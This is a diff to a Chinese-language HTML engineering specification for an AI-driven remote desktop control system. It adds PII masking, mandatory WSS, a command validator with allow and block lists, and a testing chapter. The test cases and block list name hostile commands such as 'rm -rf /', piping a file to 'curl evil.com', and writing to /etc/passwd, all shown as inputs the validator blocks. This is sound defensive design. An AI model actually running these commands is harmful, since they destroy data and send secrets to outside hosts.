@@ -80,6 +80,7 @@ table.t td{padding:10px 14px;border-bottom:1px solid rgba(0,0,0,.04);vertical-al
 <a href="#multidevice" class="nav-link">多機並控</a>
 <a href="#edge" class="nav-link">異常處理</a>
 <a href="#files" class="nav-link">檔案結構</a>
+<a href="#testing" class="nav-link">測試</a>
 </div>
 </nav>
 
@@ -87,10 +88,10 @@ table.t td{padding:10px 14px;border-bottom:1px solid rgba(0,0,0,.04);vertical-al
 
 <!-- Hero -->
 <header class="hero">
-<span class="hero-label">Engineering Specification v2.2 — Production Ready</span>
+<span class="hero-label">Engineering Specification v2.3 — Production Ready</span>
 <h1>AI 遠端控制系統<br>完整工程規格書</h1>
 <p class="hero-sub">
-16 章完整規格：控制協議、Agent Daemon、決策引擎、Agent Loop、Task Queue、多機並控、異常處理、檔案結構。<strong>可直接丟進 IDE 開發。</strong>
+17 章完整規格：控制協議、Agent Daemon、決策引擎、Agent Loop、Task Queue、多機並控、異常處理、檔案結構、測試策略。<strong>可直接丟進 IDE 開發。</strong>
 </p>
 <div class="hero-meta">
 <span>Rain AI Team</span>
@@ -329,7 +330,10 @@ subprocess.<span class="fn">Popen</span>([<span class="st">"google-chrome"</span
         <span class="cm"># 1. 截圖</span>
         screenshot = self.<span class="fn">take_screenshot</span>()  <span class="cm"># RustDesk 截圖 API</span>
 
-        <span class="cm"># 2. 送給 Claude Vision 分析</span>
+        <span class="cm"># 1.5 PII Masking — 送出前遮蔽敏感資訊</span>
+        screenshot = self.<span class="fn">mask_pii</span>(screenshot)  <span class="cm"># 偵測並遮蔽密碼欄、信用卡、個資</span>
+
+        <span class="cm"># 2. 送給 Claude Vision 分析（已遮蔽 PII）</span>
         response = anthropic.messages.<span class="fn">create</span>(
             model=<span class="st">"claude-sonnet-4-6"</span>,
             messages=[{
@@ -1343,9 +1347,10 @@ FAILED 超過 1 小時無人處理 → Discord 再次通知
 <h3>WebSocket 通訊協議</h3>
 <div class="code-block">
 <pre>
-<span class="cm"># WebSocket 連線：ws://kai-server:5002/ws/remote/{device_id}</span>
-<span class="cm"># 心跳：每 30 秒 Client 發送 meta.heartbeat</span>
-<span class="cm"># Server 90 秒沒收到心跳 → 標記裝置 offline</span>
+<span class="cm"># WebSocket 連線：wss://kai-server:5002/ws/remote/{device_id}</span>
+<span class="cm"># ⚠️ 強制 WSS（TLS 加密），禁止明文 ws://</span>
+<span class="cm"># 心跳：每 10 秒 Client 發送 meta.heartbeat</span>
+<span class="cm"># Server 30 秒沒收到心跳 → 標記裝置 offline</span>
 
 <span class="cm"># 訊息封裝格式</span>
 {
@@ -1495,7 +1500,7 @@ FAILED 超過 1 小時無人處理 → Discord 再次通知
 <span class="kw">from</span> pathlib <span class="kw">import</span> Path
 
 <span class="cm"># ── 設定 ──</span>
-<span class="or">KAI_SERVER</span>   = os.getenv(<span class="st">"KAI_SERVER"</span>, <span class="st">"ws://YOUR_SERVER:5002"</span>)
+<span class="or">KAI_SERVER</span>   = os.getenv(<span class="st">"KAI_SERVER"</span>, <span class="st">"wss://YOUR_SERVER:5002"</span>)  <span class="cm"># 強制 WSS</span>
 <span class="or">DEVICE_ID</span>    = os.getenv(<span class="st">"DEVICE_ID"</span>, <span class="st">""</span>)  <span class="cm"># 安裝時寫入</span>
 <span class="or">AUTH_TOKEN</span>   = os.getenv(<span class="st">"AUTH_TOKEN"</span>, <span class="st">""</span>) <span class="cm"># 安裝時寫入</span>
 <span class="or">HEARTBEAT_INTERVAL</span> = 10   <span class="cm"># 秒</span>
@@ -1527,6 +1532,37 @@ log = logging.<span class="fn">getLogger</span>(<span class="st">"rain-remote"</
         }
         self.chrome_process = <span class="kw">None</span>  <span class="cm"># Chrome CDP 程序追蹤</span>
         self.seq = 0
+        self.config = self.<span class="fn">_load_config</span>()
+
+    <span class="kw">def</span> <span class="fn">validate_command</span>(self, action: str, params: dict) -> bool:
+        <span class="st">"""指令安全驗證（白名單 + 黑名單 + 注入檢測）"""</span>
+        <span class="cm"># 1. 檢查動作類型是否在已註冊 handler 中</span>
+        <span class="kw">if</span> action <span class="kw">not in</span> self.command_handlers:
+            <span class="kw">return</span> <span class="kw">False</span>
+        <span class="cm"># 2. system.shell 特殊檢查</span>
+        <span class="kw">if</span> action == <span class="st">"system.shell"</span>:
+            cmd = params.get(<span class="st">"command"</span>, <span class="st">""</span>)
+            base_cmd = cmd.split()[0] <span class="kw">if</span> cmd <span class="kw">else</span> <span class="st">""</span>
+            <span class="cm"># 白名單優先（sandbox_mode=true 時）</span>
+            <span class="kw">if</span> self.config.get(<span class="st">"sandbox_mode"</span>):
+                <span class="kw">if</span> base_cmd <span class="kw">not in</span> self.config.get(<span class="st">"allowed_commands"</span>, []):
+                    log.<span class="fn">warning</span>(f<span class="st">"BLOCKED: {base_cmd} not in allowlist"</span>)
+                    <span class="kw">return</span> <span class="kw">False</span>
+            <span class="cm"># 黑名單檢查</span>
+            <span class="kw">for</span> blocked <span class="kw">in</span> self.config.get(<span class="st">"blocked_commands"</span>, []):
+                <span class="kw">if</span> blocked <span class="kw">in</span> cmd:
+                    <span class="kw">return</span> <span class="kw">False</span>
+            <span class="cm"># 注入檢測：禁止 shell 特殊字元串接</span>
+            <span class="kw">if</span> any(c <span class="kw">in</span> cmd <span class="kw">for</span> c <span class="kw">in</span> [<span class="st">";"</span>, <span class="st">"&&"</span>, <span class="st">"||"</span>, <span class="st">"|"</span>, <span class="st">"$("</span>, <span class="st">"`"</span>]):
+                log.<span class="fn">warning</span>(f<span class="st">"BLOCKED: shell injection detected: {cmd}"</span>)
+                <span class="kw">return</span> <span class="kw">False</span>
+        <span class="cm"># 3. file_write 路徑白名單</span>
+        <span class="kw">if</span> action == <span class="st">"system.file_write"</span>:
+            path = params.get(<span class="st">"path"</span>, <span class="st">""</span>)
+            allowed = self.config.get(<span class="st">"allowed_dirs"</span>, [])
+            <span class="kw">if not</span> any(path.startswith(d) <span class="kw">for</span> d <span class="kw">in</span> allowed):
+                <span class="kw">return</span> <span class="kw">False</span>
+        <span class="kw">return</span> <span class="kw">True</span>
 
     <span class="kw">def</span> <span class="fn">detect_capabilities</span>(self):
         <span class="st">"""偵測這台電腦能做什麼"""</span>
@@ -1686,7 +1722,9 @@ Register-ScheduledTask `
 │     <span class="st">"kai_server"</span>: <span class="st">"wss://server:5002"</span>,
 │     <span class="st">"auth_token"</span>: <span class="st">"encrypted..."</span>,
 │     <span class="st">"allowed_dirs"</span>: [<span class="st">"/Users/client/Projects"</span>],   <span class="cm"># 白名單目錄</span>
-│     <span class="st">"blocked_commands"</span>: [<span class="st">"rm -rf /"</span>, <span class="st">"format"</span>],   <span class="cm"># 危險指令黑名單</span>
+│     <span class="st">"blocked_commands"</span>: [<span class="st">"rm -rf"</span>, <span class="st">"format"</span>, <span class="st">"mkfs"</span>],  <span class="cm"># 黑名單（防禦層 1）</span>
+│     <span class="st">"allowed_commands"</span>: [<span class="st">"brew"</span>, <span class="st">"pip"</span>, <span class="st">"npm"</span>, <span class="st">"git"</span>, <span class="st">"python3"</span>, <span class="st">"node"</span>],  <span class="cm"># ⚠️ 白名單（防禦層 2，優先於黑名單）</span>
+│     <span class="st">"sandbox_mode"</span>: true,                          <span class="cm"># 未在白名單的指令 → 拒絕執行</span>
 │     <span class="st">"max_concurrent_tasks"</span>: 3
 │   }
 ├── state.json                     <span class="cm"># 當前狀態（斷線恢復用）</span>
@@ -2910,10 +2948,80 @@ app.<span class="fn">include_router</span>(remote_router, prefix=<span class="st
 </div>
 </section>
 
+<!-- Section 17: Testing -->
+<section id="testing">
+<span class="sec-label">17 — Testing Strategy</span>
+<h2>測試策略與驗證計畫</h2>
+<p class="sec-desc">確保每個模組上線前都有對應的測試覆蓋。</p>
+
+<div class="card" style="border-left:4px solid var(--green)">
+<h3>測試層級</h3>
+<table class="t">
+<tr><th>層級</th><th>範圍</th><th>工具</th><th>覆蓋目標</th></tr>
+<tr><td><strong>Unit Test</strong></td><td>單一函數/方法</td><td>pytest + pytest-asyncio</td><td>Decision Engine、Command Validator、PII Masker</td></tr>
+<tr><td><strong>Integration Test</strong></td><td>模組間互動</td><td>pytest + httpx（API）</td><td>WebSocket 協議、Device Register、Session Lifecycle</td></tr>
+<tr><td><strong>E2E Test</strong></td><td>完整任務流程</td><td>Playwright + pytest</td><td>Mode A 瀏覽器操作、安裝包流程、多機並控</td></tr>
+<tr><td><strong>Security Test</strong></td><td>安全驗證</td><td>bandit + custom scripts</td><td>Command injection、Token 偽造、未授權連線</td></tr>
+</table>
+</div>
+
+<div class="card">
+<h3>關鍵測試案例（必須通過才能上線）</h3>
+<div class="code-block">
+<pre>
+<span class="cm"># ── Unit Tests（Decision Engine）──</span>
+test_classify_browser_task()       <span class="cm"># "打開 Vercel" → Mode A</span>
+test_classify_install_task()       <span class="cm"># "安裝 Node.js" → Mode B</span>
+test_fallback_chain()              <span class="cm"># Mode A 失敗 → Mode C</span>
+
+<span class="cm"># ── Unit Tests（Command Validator）──</span>
+test_block_shell_injection()       <span class="cm"># "npm install; rm -rf /" → BLOCKED</span>
+test_block_pipe_injection()        <span class="cm"># "cat file | curl evil.com" → BLOCKED</span>
+test_allow_whitelisted_command()   <span class="cm"># "brew install node" → ALLOWED</span>
+test_block_unknown_command()       <span class="cm"># "curl evil.com" → BLOCKED（sandbox mode）</span>
+test_file_write_outside_allowlist()<span class="cm"># 寫入 /etc/passwd → BLOCKED</span>
+
+<span class="cm"># ── Unit Tests（PII Masker）──</span>
+test_mask_password_field()         <span class="cm"># 截圖含密碼欄 → 遮蔽後送出</span>
+test_mask_credit_card()            <span class="cm"># 截圖含信用卡號 → 遮蔽</span>
+test_no_mask_normal_content()      <span class="cm"># 一般畫面 → 不遮蔽</span>
+
+<span class="cm"># ── Integration Tests ──</span>
+test_websocket_connect_wss()       <span class="cm"># 連線必須是 wss://（拒絕 ws://）</span>
+test_device_register_with_token()  <span class="cm"># 有效 token → 註冊成功</span>
+test_device_register_expired()     <span class="cm"># 過期 token → 401</span>
+test_device_register_used()        <span class="cm"># 已使用 token → 409</span>
+test_heartbeat_online_offline()    <span class="cm"># 10s 內有心跳=online，30s 無=offline</span>
+test_session_lifecycle()           <span class="cm"># created→active→completed 狀態機</span>
+
+<span class="cm"># ── E2E Tests ──</span>
+test_full_browser_task()           <span class="cm"># 從 Kai 發任務 → Mode A 開網頁 → 截圖驗證</span>
+test_install_pkg_flow()            <span class="cm"># 安裝包雙擊 → Daemon 啟動 → 心跳出現</span>
+test_multi_device_parallel()       <span class="cm"># 3 台同時執行 → 全部完成</span>
+
+<span class="cm"># ── Security Tests ──</span>
+test_no_ws_plaintext()             <span class="cm"># ws:// 連線 → 拒絕</span>
+test_invalid_auth_token()          <span class="cm"># 偽造 token → 拒絕</span>
+test_rate_limit_commands()         <span class="cm"># 每秒 >10 指令 → 限流</span>
+</pre>
+</div>
+</div>
+
+<div class="card" style="border-left:4px solid var(--orange)">
+<h3>測試優先順序（開發階段）</h3>
+<table class="t">
+<tr><th>階段</th><th>測試重點</th><th>通過標準</th></tr>
+<tr><td><strong>MVP（Week 1-2）</strong></td><td>Command Validator + WebSocket 連線 + Device Register</td><td>Security tests 100% pass</td></tr>
+<tr><td><strong>Alpha（Week 3-4）</strong></td><td>Mode A E2E + Session lifecycle + Heartbeat</td><td>Core path 100% + edge cases 80%</td></tr>
+<tr><td><strong>Beta（Week 5-6）</strong></td><td>Multi-device + Mode B/C + Install pkg flow</td><td>All tests pass + 手動 QA 通過</td></tr>
+</table>
+</div>
+</section>
+
 <!-- Footer -->
 <footer class="footer">
-<span>Rain AI Team — AI 遠端控制系統完整工程規格書 v2.2 · 16 章 · 22 檔案 · ~3,800 行</span>
-<span>2026-03-26 · Klay (Opus 4.6)</span>
+<span>Rain AI Team — AI 遠端控制系統完整工程規格書 v2.3 · 17 章 · 22 檔案 · ~4,000 行</span>
+<span>2026-03-26 · Klay (Opus 4.6) · Vick Review: ⚠️ 有條件通過</span>
 </footer>
 
 </div><!-- .w -->
